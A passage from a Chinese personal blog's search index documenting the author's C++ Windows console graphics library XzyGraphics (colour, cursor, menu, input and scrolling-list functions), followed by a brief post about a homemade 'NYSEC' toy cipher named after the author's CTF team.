<p><strong>颜色：</strong><br>下划线加颜色单词，例如_Red为红色。<br>下划线前加<strong>H</strong>代表高亮,H_Red为高亮红。<br>高亮灰H_Gray为白色。<br>所有的颜色单词可以在头文件中看到。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SETCOLOR(_Green,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//执行后接下来程序的输出颜色就是绿色了，</span></span><br><span class="line"><span class="comment">//后两个参数是颜色修改失败时报错信息的输出位置</span></span><br></pre></td></tr></table></figure></div>
<p><strong>光标：</strong><br>光标的显示与隐藏可以使用<strong>GUANGBIAO</strong>函数来控制。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">GUANGBIAO(<span class="number">0</span>);<span class="comment">//0为不显示，1为显示</span></span><br></pre></td></tr></table></figure></div>
<p><strong>输出：</strong><br>封装了一个输出函数<strong>SAY</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SAY(H_Green,<span class="number">4</span>,<span class="number">5</span>,<span class="string">"Hello World!"</span>);</span><br><span class="line"><span class="comment">//在（4，5）位置输出一个高亮的绿色Hello World！</span></span><br></pre></td></tr></table></figure></div>

<h2 id="绘制函数"><a href="#绘制函数" class="headerlink" title="绘制函数"></a>绘制函数</h2><p><strong>ANYLINE</strong>函数是用来画横线的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ANYLINE(_Blue,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="string">"+"</span>,<span class="number">1</span>);<span class="comment">//这条语句将会在（2，3）的位置输出5次+，每次输出后向右移动1个单位。</span></span><br></pre></td></tr></table></figure></div>
<p><strong>VERTICALLINE</strong>函数是用来画竖线的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">VERTICALLINE(_Yellow,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="string">"|"</span>);<span class="comment">//从（4，5）开始向下输出7次 |。</span></span><br></pre></td></tr></table></figure></div>
<p><strong>DRAW_SQURE</strong>函数用来画方框</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DRAW_SQURE(<span class="number">1</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">7</span>,_Green,<span class="string">"+"</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//很简单，看看变量名就知道了</span></span><br></pre></td></tr></table></figure></div>
<p>绘制函数基本上还没有怎么写，以后会有更多方便的绘制函数。主要的内容在下面。</p>
<h1 id="FORM类"><a href="#FORM类" class="headerlink" title="FORM类"></a>FORM类</h1><p>FORM是一个可以生成选单的类</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> selection = <span class="number">0</span>;</span><br><span class="line"><span class="function">FORM <span class="title">HELP</span><span class="params">(<span class="number">3</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">2</span>)</span></span>;<span class="comment">//实例化一个选单对象HELP</span></span><br><span class="line">HELP.title = <span class="string">"Developer  N0P3"</span>;<span class="comment">//设置选单的标题</span></span><br><span class="line">HELP.TitleColor = H_GreenBlue;<span class="comment">//设置标题的颜色</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">0</span>, <span class="string">"键入限制函数 ENTER"</span>);<span class="comment">//设置0号选项名字</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">1</span>, <span class="string">"选单类 FORM"</span>);<span class="comment">//设置1号选项名字</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">2</span>, <span class="string">"绘制函数组"</span>);<span class="comment">//设置2号选项名字</span></span><br><span class="line">HELP.SETOPTIONNAME(<span class="number">3</span>, <span class="string">"其他"</span>);<span class="comment">//设置3号选项名字</span></span><br><span class="line">selection = HELP.SELECTION(<span class="number">10</span>, <span class="number">0</span>, <span class="number">14</span>);<span class="comment">//展开选单并让用户选择</span></span><br><span class="line"><span class="comment">//只需要简单的几行就可以构造一个完整的选择菜单</span></span><br></pre></td></tr></table></figure></div>
<p>实例化一个选单对象时，前四个参数指定了生成位置左上角横纵坐标和右下角横纵坐标，最后两个是横向选项个数和纵向选项个数。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.23.03.png" data-fancybox="group" data-caption="自动生成的2x2选择菜单" class="fancybox"><img alt="自动生成的2x2选择菜单" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.23.03.png" class="lazyload" title="自动生成的2x2选择菜单"></a><br>//觉得丑(?)可以自定义颜色和符号</p>
<h2 id="主要成员变量"><a href="#主要成员变量" class="headerlink" title="主要成员变量"></a>主要成员变量</h2><p><strong>字符串（string）：</strong><br>选单标题<strong>title</strong>，构成选单的字符<strong>FormStr</strong><br>，构成选项的字符<strong>OptionStr</strong>.</p>
<p><strong>整型 (int):</strong></p>
<p>选单的左上角坐标<strong>x1,y1</strong><br>选单的右下角坐标<strong>x2,y2</strong><br>选单标题的颜色<strong>TitleColor</strong><br>每行选项个数<strong>optionX</strong><br>每列选项个数<strong>optionY</strong></p>
<h2 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h2><p><strong>选择函数SELECTION：</strong><br>共接收三个整型参数：<br>选单外框颜色<strong>COLOR_form</strong><br>选项的颜色<strong>COLOR_option</strong><br>选项名的颜色<strong>COLOR_str</strong></p>
<p>返回值为整型，返回的是选项的值。选项的值默认从0开始按从上到下，从左到右的顺序直至最后一个选项。</p>
<p>函数调用后会在控制台展开一个选单，wsad（小写）控制高亮显示的选项，按下回车则函数返回选项的值，esc键退出选择返回值 -1。</p>
<p>使用后的选单不会清理自己。</p>
<p><strong>清空函数CLEAR：</strong><br>不需要参数，调用后清理选单所在的位置<br>无返回值</p>
<p><strong>设置值函数SETVALUE：</strong><br>需要两个整型参数：<br>选项编号<strong>id</strong><br>修改的值<strong>InValue</strong><br>无返回值。</p>
<p><strong>获得值函数GETVALUE：</strong><br>提供选项编号<strong>id</strong>，返回选项的值。</p>
<p><strong>设置选项名函数SETOPTIONNAME：</strong><br>提供选项编号<strong>id</strong>和选项名<strong>InName</strong>，默认选项没有名字。</p>
<p><strong>获得选项值函数GETOPTIONNAME：</strong><br>提供选项编号<strong>id</strong>，返回选项的名字。</p>
<p><strong>获得选项坐标函数GETOPTIONXY：</strong><br>需要提供选项<strong>id</strong>和两个用于储存选项坐标的整型变量。</p>
<p><strong>绘制函数DRAW：</strong><br>同样需要三个整型参数：<br>选单外框颜色<strong>COLOR_form</strong><br>选项的颜色<strong>COLOR_option</strong><br>选项名的颜色<strong>COLOR_str</strong><br>绘制函数会在屏幕上绘制选单。<br>无返回值</p>
<p><strong>测试函数TEST：</strong><br><em>这个函数旨在开发阶段帮助开发者调整合适的选单参数。</em></p>
<p>不需要参数。</p>
<p> 执行后方框会集中在左上角，wasd和ijkl分别控制方框的左上角和右下角，如果发生诡异的显示状况，可能是右下角不再是右下角导致的。<br>建议在使用的时候先控制右下角远离左上角。</p>
<p>按下<strong>[ENTER]</strong>预览生成效果，再按一次回到移动模式。按下<strong>[TAB]</strong>键可以隐藏方框，再按一次显示方框。</p>
<h1 id="输入限制函数ENTER"><a href="#输入限制函数ENTER" class="headerlink" title="输入限制函数ENTER"></a>输入限制函数ENTER</h1><p>这个函数在写图形界面时非常实用。<br>如果使用cin接收用户输入的话，用户可以通过输入换行和空格破坏画面。<br>使用ENTER函数就可以限制用户的输入。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ENTER(H_Gray,<span class="number">5</span>,<span class="number">7</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//指定颜色为白色，在（5，7）的位置输入，并最长为10个字符超过会闪红色。</span></span><br></pre></td></tr></table></figure></div>
<p>但是并不能正确处理宽字节，也就无法输入中文。<br>后续的更新会解决这个问题。</p>
<h1 id="SCROLL-LIST类"><a href="#SCROLL-LIST类" class="headerlink" title="SCROLL_LIST类"></a>SCROLL_LIST类</h1><p>SCROLL_LIST是一个可以生成滚动信息栏的类</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">SCROLL_LIST <span class="title">TestList</span><span class="params">(<span class="number">5</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">7</span>)</span></span>;</span><br><span class="line">TestList.title = <span class="string">"信息栏"</span>;</span><br><span class="line">TestList.TitleColor = H_Yellow;</span><br><span class="line">TestList.DRAW(H_Blue);</span><br><span class="line">TestList.CREATERECORD(H_Green, <span class="string">"Hello World!"</span>);</span><br><span class="line">TestList.CREATERECORD(H_GreenBlue, <span class="string">"[N0P3]:"</span>, H_Gray, <span class="string">"Hello World!"</span>, H_Green, <span class="string">"   --OK"</span>);</span><br><span class="line"><span class="comment">//最后看起来很长的代码其实非常简单</span></span><br></pre></td></tr></table></figure></div>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.49.png" data-fancybox="group" data-caption="滚动信息栏" class="fancybox"><img alt="滚动信息栏" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.49.png" class="lazyload" title="滚动信息栏"></a><br>//又觉得丑(?）还是可以自定义颜色和符号</p>
<p>滚动信息栏的使用设计和选单很不一样。</p>
<h2 id="主要成员变量-1"><a href="#主要成员变量-1" class="headerlink" title="主要成员变量"></a>主要成员变量</h2><p><strong>字符串（string）：</strong><br>信息栏标题<strong>title</strong><br>构成信息栏边框的字符<strong>Str</strong></p>
<p><strong>整型 (int):</strong><br>信息栏左上角坐标<strong>x,y</strong><br>选单标题的颜色<strong>TitleColor</strong><br>信息栏的长度（每行最多显示的长度）<strong>StrLimit</strong><br>信息栏的高度（最多显示多少行）<strong>MaxNum</strong></p>
<h2 id="成员函数-1"><a href="#成员函数-1" class="headerlink" title="成员函数"></a>成员函数</h2><p><strong>信息栏绘制函数DRAW：</strong><br>提供一个颜色参数，在控制台打印出信息栏的外框<br>无返回值。</p>
<p><strong>清空函数CLEAR：</strong><br>不需要参数，调用后清理信息栏所在的位置<br>无返回值。</p>
<p><strong>创造记录函数CREATERECORD</strong><br>创造纪录函数的参数最多为六个，<br>分为三组，每组由颜色和字符串两个参数组成。<br>按顺序称为记录的第一部分，第二部分和第三部分。<br>上面截图的第一条记录只用到了一个部分。<br>第二条用到了三部分。<br>第一部分通常起提示的作用，所以后两个部分如果过长会自动换行并与第一部分对齐。<br><em>现在中文换行可能会出现乱码，后续的更新会解决这个问题。</em><br><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.09.png" data-fancybox="group" data-caption="换行演示" class="fancybox"><img alt="换行演示" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.09.png" class="lazyload" title="换行演示"></a><br>在实例化一个滚动信息栏对象后，<br>在程序的任何位置调用此函数就能立即在信息栏输出信息。信息过长会自动换行，超过显示的上限会滚动显示。</p>
<p><strong>滚动函数ROLL</strong><br>两个颜色参数分别指定信息栏外框的颜色和光标指针的颜色。<br>按ws来控制光标上下移动，光标到顶端或底部后继续向上或向下信息栏会开始滚动。<br>按下[ENTER]会返回光标所在的行数。行数从0开始向下递增。<br>按[ESC]返回-1；<br><strong>播放函数DISPLAY</strong><br>提供开始和结束的行数，信息栏就会显示这一段信息。<em>播放不存在的信息会访问到非法内存</em><br><strong>获得记录函数GETRECORD</strong><br>提供行数返回一个RECORD对象。<br><em>直接对信息栏中的信息进行操作可能会导致访问非法内存等问题</em></p>
<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>XzyGraphics库只是我在大一时方便自己写程序的工具，分享出来帮助和我一样正在学习的人创造更好看的命令行界面。<em>(它用起来真的很简单!)</em>它的不足和缺点还有很多，我也会坚持继续更新。如果你有建议或问题，发送邮件至<a href="mailto:n0p3@nyist.edu.cn">n0p3@nyist.edu.cn</a>。<br>感谢你花时间来阅读我的第一篇博客。：）</p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/XzyGraphics%5B2.2%5D.zip" target="_blank" rel="noopener">XzyGraphics库</a></p>
]]></content>
      <tags>
        <tag>C++，Windows，图形</tag>
      </tags>
  </entry>
  <entry>
    <title>NYSEC密码</title>
    <url>/2020/02/10/NYSEC%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>前两天得知猪圈密码居然还有皮肤版</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/029E344D37AF3D5305AEA510BE32B8A9.jpg" data-fancybox="group" data-caption="圣堂武士密码" class="fancybox"><img alt="圣堂武士密码" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/029E344D37AF3D5305AEA510BE32B8A9.jpg" class="lazyload" title="圣堂武士密码"></a></p>
<p>顿时觉得真是谁都能设计个密码出来。</p>
<p>于是我就搞了个NYSEC密码。</p>
<p>NYSEC是我们战队的名字，密文中也只出现了这五个字母。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/NYSEC-CODE.zip" target="_blank" rel="noopener">NYSEC编解码程序</a></p>
<p>Cover: Unsplash @jn1434</p>
]]></content>
      <tags>
        <tag>密码</tag>
      </tags>
  </entry>
</search>
